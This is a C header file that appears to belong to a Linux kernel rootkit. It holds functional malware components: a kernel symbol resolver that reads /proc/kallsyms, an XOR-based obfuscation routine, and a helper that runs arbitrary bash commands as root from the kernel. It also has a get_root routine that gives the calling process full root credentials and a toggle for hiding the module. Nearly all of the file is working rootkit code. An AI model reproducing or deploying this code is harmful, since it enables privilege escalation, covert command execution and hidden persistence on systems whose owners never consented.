#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
# include <linux/kmod.h>
#else
# include <linux/umh.h>
#endif

#define do_encrypt(ptr, len, key)	do_encode(ptr, len, key)
#define do_decrypt(ptr, len, key)	do_encode(ptr, len, key)

//int (*vtest_kallsyms_on_each_symbol)(int (*fn)(void *, const char *, struct module *,
//				      unsigned long),
//			    void *data);

static unsigned long vtest_lookup_name(const char *name)
{
    unsigned int i = 0, first_space_idx = 0, second_space_idx = 0; /* Read Index and indexes of spaces */
    struct file *proc_ksyms = NULL;
    loff_t pos = 0;
    unsigned long ret = 0;
    ssize_t read = 0;
    int err = 0;
    const size_t name_len = strlen(name);

    /*
     * Buffer for each line of kallsyms file.
     * Linux defines KSYM_NAME_LEN to 512 since 6.1, with a rational documented in commit
     * https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/include/linux/kallsyms.h?id=b8a94bfb33952bb17fbc65f8903d242a721c533d
     */
    char proc_ksyms_entry[512] = {0};

    proc_ksyms = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (proc_ksyms == NULL)
        goto cleanup;

    read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &pos);
    while (read == 1) {
        if (proc_ksyms_entry[i] == '\n' || (size_t)i == sizeof(proc_ksyms_entry) - 1) {
            /* Prefix-match the name with the 3rd field of the line, after the second space */
            if (second_space_idx > 0 &&
                second_space_idx + 1 + name_len <= sizeof(proc_ksyms_entry) &&
                !strncmp(proc_ksyms_entry + second_space_idx + 1, name, name_len)) {
                printk(KERN_INFO "[+] %s: %.*s\n", name,
                        i, proc_ksyms_entry);
                /* Decode the address, which is in hexadecimal */
                proc_ksyms_entry[first_space_idx] = '\0';
                err = kstrtoul(proc_ksyms_entry, 16, &ret);
                if (err) {
                    printk(KERN_ERR "kstrtoul returned error %d while parsing %.*s\n",
                            err, first_space_idx, proc_ksyms_entry);
                    ret = 0;
                    goto cleanup;
                }
                goto cleanup;
            }

            i = 0;
            first_space_idx = 0;
            second_space_idx = 0;
            memset(proc_ksyms_entry, 0, sizeof(proc_ksyms_entry));
        } else {
            if (proc_ksyms_entry[i] == ' ') {
                if (first_space_idx == 0) {
                    first_space_idx = i;
                } else if (second_space_idx == 0) {
                    second_space_idx = i;
                }
            }
            i++;
        }
        read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &pos);
    }
    printk(KERN_ERR "symbol not found in kallsyms: %s\n", name);

cleanup:
    if (proc_ksyms != NULL)
        filp_close(proc_ksyms, 0);
    return ret;
}

static inline unsigned int custom_rol32(unsigned int val, int n)
{
	return ((val << n) | (val >> (32 - n)));
}

static inline void do_encode(void *ptr, unsigned int len, unsigned int key)
{
	while (len > sizeof(key)) {
		*(unsigned int *)ptr ^= custom_rol32(key ^ len, (len % 13));
		len -= sizeof(key), ptr += sizeof(key);
	}
}

static inline int exec(char **argv)
{
	char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; 
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static inline int run_cmd(char *cmd)
{
	char *argv[] = {"/bin/bash", "-c", cmd, NULL};
	return exec(argv);
}

static int ksym_lookup_cb(unsigned long data[], const char *name, void *module,
			  unsigned long addr)
{
	int i = 0;
	while (!module && (((const char *)data[0]))[i] == name[i]) {
		if (!name[i++])
			return !!(data[1] = addr);
	}
	return 0;
}

static inline unsigned long ksym_lookup_name(const char *name)
{
	int (*vtest_kallsyms_on_each_symbol)(int (*fn)(void *, const char *, struct module *,
                                      unsigned long),
                            void *data) = NULL;
	unsigned long data[2] = {(unsigned long)name, 0};
	vtest_kallsyms_on_each_symbol = (void*)vtest_lookup_name("kallsyms_on_each_symbol");
	vtest_kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
	return data[1];
}

#ifdef CONFIG_GIVE_ROOT
static inline void get_root(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
	current->uid = 0;
	current->suid = 0;
	current->euid = 0;
	current->gid = 0;
	current->egid = 0;
	current->fsuid = 0;
	current->fsgid = 0;
	cap_set_full(current->cap_effective);
	cap_set_full(current->cap_inheritable);
	cap_set_full(current->cap_permitted);
#else
	commit_creds(prepare_kernel_cred(0));
#endif
}
#endif

extern int hidden;

static inline void flip_hidden_flag(void)
{
    if (hidden)
        hidden = 0;
    else
        hidden = 1;
}

int util_init(void);
int get_cmdline(struct task_struct *task, char *buffer, int buflen);
//int run_cmd(const char *cmd);
